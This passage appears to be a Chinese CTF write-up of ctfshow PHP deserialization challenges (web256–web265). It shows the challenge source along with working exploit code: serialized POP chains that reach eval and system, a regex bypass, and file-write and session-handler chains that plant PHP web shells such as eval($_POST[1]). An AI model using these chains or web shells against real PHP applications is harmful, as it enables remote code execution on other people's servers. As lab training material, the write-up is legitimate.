class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将其抓包放入cookie中放包（记得要加路径）。</p><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>同上相差不大</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/`[oc]:\d+:/i意思就是不能出现O:数字，我们用<span class="number">0</span>:+数字即可绕过。`</span><br><span class="line">[oc]: 就是正则匹配的意思</span><br><span class="line">\d:  匹配一个数字字符。等价于 [<span class="number">0</span>-<span class="number">9</span>]。</span><br><span class="line"> +:  匹配前面的子表达式一次或多次。例如，<span class="string">&#x27;zo+&#x27;</span> 能匹配 <span class="string">&quot;zo&quot;</span> 以及 <span class="string">&quot;zoo&quot;</span>，但不能匹配 <span class="string">&quot;z&quot;</span>。+ 等价于 &#123;<span class="number">1</span>,&#125;。</span><br><span class="line">/i:  表示匹配的时候不区分大小写</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此和上一题的构造相似，但是要将构造好的序列化中的O:数字变为O:+数字。</p><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>不太会，之后补上<br>大佬的做法：<a href="https://y4tacker.blog.csdn.net/article/details/110521104">Y4tacker</a></p><blockquote><p>array_pop（array）：该函数是将数组中的最后一个元素删除。</p></blockquote><p>本题需要构造POST请求头使得使得<br>token=ctfshow<br>从而将flag放入到flag.txt中<br>利用<br>Soapclient（）函数构造请求头。</p><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,serialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从中可以看出需要构造的pop链条中要包含’ctfshow_i_love_36D‘，因此构造代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshow());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>file_put_contents() 函数用于把字符串写入文件，成功返回写入到文件内数据的字节数，失败则返回 FALSE<br>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_put_contents(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;This is something.&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="keyword">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从中我们可以看出我们有两个利用点，由于__invoke()在题中根本没有使用，所以只能用__destruct()这个方法。利用file_put_contents()函数写出php文件并访问。当然传入的参数也要是pop链，因此进行以下构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&quot;&lt;?php eval(system(&#x27;tac /fl*&#x27;)); ?&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshowvip());</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p><a href="https://blog.csdn.net/weixin_45669205/article/details/114163197">反序列化字符串逃逸</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/108210822?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163567204116780271573129%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163567204116780271573129&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-108210822.pc_search_all_es&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8&spm=1018.2226.3001.4187">反序列化逃逸</a><br>一些小知识：<br>setcookie(name,value,expire,path,domain,secure)<br>参数    描述<br>name    必需。规定 cookie 的名称。<br>value    必需。规定 cookie 的值。<br>expire    可选。规定 cookie 的有效期。<br>path    可选。规定 cookie 的服务器路径。<br>domain    可选。规定 cookie 的域名。<br>secure    可选。规定是否通过安全的 HTTPS 连接来传输 cookie。</p><p>本题中通过setcookie让服务器通过cookie发送name值，之后在通过$_COOKIE这个魔术变量接收键为name的值。</p><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>存在<a href="http://www.zip,把代码下载下来进行审计./">www.zip，把代码下载下来进行审计。</a><br>在inc.php那里发现这个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//还有一种是ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span></span><br></pre></td></tr></table></figure><p>第一反应肯定就是session反序列化了，这里把session的session.serialize_handler设置为php，暗示了默认的php.ini里面的肯定不是php，大概率是php_serialize。既然session序列化存储的引擎存在差异，自然可以进行攻击了：</p><blockquote><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。<br>会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过<br>session_set_save_handler() 设定的用户自定义会话管理器。 通过 read<br>回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p></blockquote><p>先判断一下session是否可控。如果不可控的话可能就要利用文件上传了。<br>全局搜索一下session，发现首先是这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一次访问index.php就会产生session，之后如果limit没超过5的话，$_SESSION[‘limit’]=base64_decode($_COOKIE[‘limit’]);<br>Cookie可控，因此session就可控了。再去找一下利用点，直接找session_start，发现inc.php里面有session-start()，而且存在User类，有一个文件写入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件名和写入的内容都可控，因此可以写马，自此反序列化链也就理顺了。<br>构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">//$_SESSION[&#x27;user&#x27;]=$user;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="comment">//$s = &#x27;s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:34:&quot;<span class="meta">&lt;?php</span> eval($_POST[1]); phpinfo()? &gt;&quot;;s:6:&quot;status&quot;;N;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump(unserialize($s));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:24:&quot;<span class="meta">&lt;?php</span> eval($_POST[1]);? &gt;&quot;;s:6:&quot;status&quot;;N;&#125; </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先访问index.php，然后改cookie，再刷新一次index.php，再访问一次check.php，这样马就写好了，然后访问log-1.php,并进行操作。</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p>和web262相似，只不过一个使用session 一个使用cookie</p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span 